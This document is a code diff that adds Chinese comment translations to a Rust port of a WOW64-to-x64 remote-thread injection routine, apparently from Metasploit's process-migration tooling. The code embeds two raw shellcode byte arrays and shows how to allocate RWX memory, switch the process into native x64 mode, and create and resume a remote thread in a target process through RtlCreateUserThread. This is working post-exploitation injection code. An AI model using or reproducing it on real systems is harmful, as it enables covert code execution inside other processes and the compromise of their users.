@@ -1,13 +1,22 @@
+//! 移植自 src/inject_rtlcreateuserthread_wow64.cpp —— 这个仅 x86 的技术
+//! 先将 WOW64 进程切换到原生 x64，然后通过 RtlCreateUserThread 在目标
+//! 进程中创建远程线程。
 //! Port of src/inject_rtlcreateuserthread_wow64.cpp — the x86-only
 //! technique that transitions a WOW64 process into native x64 and creates a
 //! remote thread in the target process via RtlCreateUserThread.
 //!
+//! C++ 文件包在 `#if defined _M_IX86` 中（只编入 x86 构建）。Rust 移植版是
+//! 面向 x64 的单一代码库；该函数和两个 shellcode 字节块被原样移植，
+//! 使符号得以存在，而 x64 构建从不调用它（与 C++ _M_X64 构建一致，
+//! 那里 `inject_via_remotethread_wow64` 同样不在执行树中）。
 //! The C++ file is wrapped in `#if defined _M_IX86` (only compiled into x86
 //! builds). The Rust port is a single codebase targeting x64; the function
 //! and both shellcode blobs are ported verbatim so the symbol exists, and
 //! the x64 build never invokes it (mirroring the C++ _M_X64 build, where
 //! `inject_via_remotethread_wow64` is also absent from the execute tree).
 //!
+//! `migrate_executex64` 是 wow64->x64 转换 stub，`migrate_wownativex` 是
+//! 使用 Win64 API 创建远程线程的原生 x64 函数（参见 C++ 中引用的 asm 源码）。
 //! `migrate_executex64` is the wow64->x64 transition stub and
 //! `migrate_wownativex` is the native x64 function that uses the Win64 APIs
 //! to create the remote thread (see the asm sources referenced in the C++).
@@ -22,6 +31,7 @@ use windows_sys::Win32::System::Memory::{
 use windows_sys::Win32::System::SystemInformation::{GetVersionExA, OSVERSIONINFOA};
 use windows_sys::Win32::System::Threading::ResumeThread;
 
+/// 参见 '/msf3/external/source/shellcode/x86/migrate/executex64.asm'。
 /// see '/msf3/external/source/shellcode/x86/migrate/executex64.asm'
 const MIGRATE_EXECUTEX64: [u8; 75] = [
     0x55, 0x89, 0xE5, 0x56, 0x57, 0x8B, 0x75, 0x08, 0x8B, 0x4D, 0x0C, 0xE8, 0x00, 0x00, 0x00, 0x00,
@@ -31,6 +41,7 @@ const MIGRATE_EXECUTEX64: [u8; 75] = [
     0x04, 0x23, 0x00, 0x00, 0x00, 0x89, 0x3C, 0x24, 0xFF, 0x2C, 0x24,
 ];
 
+/// 参见 '/msf3/external/source/shellcode/x64/migrate/remotethread.asm'。
 /// see '/msf3/external/source/shellcode/x64/migrate/remotethread.asm'
 const MIGRATE_WOWNATIVEX: [u8; 296] = [
     0xFC, 0x48, 0x89, 0xCE, 0x48, 0x89, 0xE7, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC8, 0x00, 0x00, 0x00,
@@ -54,6 +65,7 @@ const MIGRATE_WOWNATIVEX: [u8; 296] = [
     0x48, 0x83, 0xC4, 0x50, 0x48, 0x89, 0xFC, 0xC3,
 ];
 
+/// WOW64CONTEXT —— 四个 8 字节联合体（handle / pointer / pointer / handle）。
 /// WOW64CONTEXT — four 8-byte unions (handle / pointer / pointer / handle).
 #[repr(C)]
 #[derive(Clone, Copy)]
@@ -64,17 +76,21 @@ struct Wow64Context {
     h_thread: u64,
 }
 
+/// X64FUNCTION 的函数原型：BOOL (WINAPI * X64FUNCTION)(DWORD dwParameter)。
 /// BOOL (WINAPI * X64FUNCTION)(DWORD dwParameter).
 type X64Function = unsafe extern "system" fn(u32) -> i32;
+/// EXECUTEX64 的函数原型：DWORD (WINAPI * EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter)。
 /// DWORD (WINAPI * EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter).
 type ExecuteX64 = unsafe extern "system" fn(X64Function, u32) -> u32;
 
+/// 使用 RtlCreateUserThread（inject_via_remotethread_wow64）。
 /// Uses RtlCreateUserThread (inject_via_remotethread_wow64).
 pub fn inject_via_remotethread_wow64(h_process: isize, lp_start_address: *mut c_void, lp_parameter: *mut c_void) -> bool {
     unsafe {
         let mut os: OSVERSIONINFOA = std::mem::zeroed();
         os.dwOSVersionInfoSize = std::mem::size_of::<OSVERSIONINFOA>() as u32;
 
+        // 检查并过滤掉 Windows 2003。这个方法在那里不知为何不起作用。
         // check for and filter out Windows 2003. This method doesn't work there for some reason.
         if GetVersionExA(&mut os) == 0 {
             return false;
@@ -85,6 +101,7 @@ pub fn inject_via_remotethread_wow64(h_process: isize, lp_start_address: *mut c_
             return false;
         }
 
+        // 在本进程中为 EXECUTEX64 函数分配一个 RWX 缓冲区。
         // alloc a RWX buffer in this process for the EXECUTEX64 function
         let p_execute_x64 = VirtualAlloc(
             std::ptr::null(),
@@ -96,6 +113,7 @@ pub fn inject_via_remotethread_wow64(h_process: isize, lp_start_address: *mut c_
             return false;
         }
 
+        // 在本进程中为 X64FUNCTION 函数（及其上下文）分配一个 RWX 缓冲区。
         // alloc a RWX buffer in this process for the X64FUNCTION function (and its context)
         let p_x64function = VirtualAlloc(
             std::ptr::null(),
@@ -107,6 +125,7 @@ pub fn inject_via_remotethread_wow64(h_process: isize, lp_start_address: *mut c_
             return false; /* TODO: pExecuteX64 not released. */
         }
 
+        // 复制 wow64->x64 stub。
         // copy over the wow64->x64 stub
         std::ptr::copy_nonoverlapping(
             MIGRATE_EXECUTEX64.as_ptr(),
@@ -114,6 +133,7 @@ pub fn inject_via_remotethread_wow64(h_process: isize, lp_start_address: *mut c_
             MIGRATE_EXECUTEX64.len(),
         );
 
+        // 复制原生 x64 函数。
         // copy over the native x64 function
         std::ptr::copy_nonoverlapping(
             MIGRATE_WOWNATIVEX.as_ptr(),
@@ -121,6 +141,7 @@ pub fn inject_via_remotethread_wow64(h_process: isize, lp_start_address: *mut c_
             MIGRATE_WOWNATIVEX.len(),
         );
 
+        // 设置上下文。
         // set the context
         let ctx = (p_x64function as *mut u8).add(MIGRATE_WOWNATIVEX.len()) as *mut Wow64Context;
         (*ctx).h_process = h_process as u64;
@@ -128,6 +149,8 @@ pub fn inject_via_remotethread_wow64(h_process: isize, lp_start_address: *mut c_
         (*ctx).lp_parameter = lp_parameter as u64;
         (*ctx).h_thread = 0;
 
+        // 将此 wow64 进程切换到原生 x64 并调用 pX64function(ctx)。
+        // 原生函数将使用原生 Win64 API 在目标进程中创建远程线程。
         // Transition this wow64 process into native x64 and call pX64function(ctx).
         // The native function will use the native Win64 API's to create a remote
         // thread in the target process.
@@ -143,6 +166,8 @@ pub fn inject_via_remotethread_wow64(h_process: isize, lp_start_address: *mut c_
             return false; /* TODO: pExecuteX64 and pX64function not released. */
         }
 
+        // 成功！从上下文中取出新的线程句柄。
+        // 麻烦的是，这个函数会把我们的线程创建为挂起状态。我知道，这很蠢。
         // Success! grab the new thread handle from the context.
         // PITA, this function creates our thread in a suspended state. Dumb, I know.
         ResumeThread((*ctx).h_thread as HANDLE);
